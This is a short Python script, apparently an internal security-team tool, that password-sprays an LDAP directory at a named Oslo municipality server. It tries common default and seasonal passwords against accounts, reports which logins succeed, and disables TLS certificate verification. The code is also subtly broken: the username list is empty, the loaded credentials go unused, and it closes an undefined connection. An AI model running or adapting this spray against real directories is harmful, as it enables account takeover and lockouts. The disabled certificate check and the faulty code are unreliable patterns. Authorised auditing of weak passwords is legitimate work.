import os, ldap

ldap_server  = 'ldaps://ldaps.oslofelles.oslo.kommune.no:636'
username  = os.environ["CSIRT_LDAPUSER"]
password  = os.environ["CSIRT_LDAPPASSWORD"]
base_dn =  "DC=oslofelles,DC=oslo,DC=kommune,DC=no"

usernames = ""

passwords = ["Admin123", "Password123", "Vinter2023", "Sommer2023"]

ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_NEVER)
ldap.set_option(ldap.OPT_PROTOCOL_VERSION, 3)
ldap_conn = ldap.initialize(ldap_server)
ldap_conn.set_option(ldap.OPT_REFERRALS, 0)

for user in usernames:
    for pwd in passwords:
        try:
            ldap_conn.bind_s(user, pwd)
            print("User {} authenticated with password {}".format(user, pwd))
        except ldap.INVALID_CREDENTIALS:
            print("User {} authentication failed with password {}".format(user, pwd))

# Close the connection
conn.unbind_s()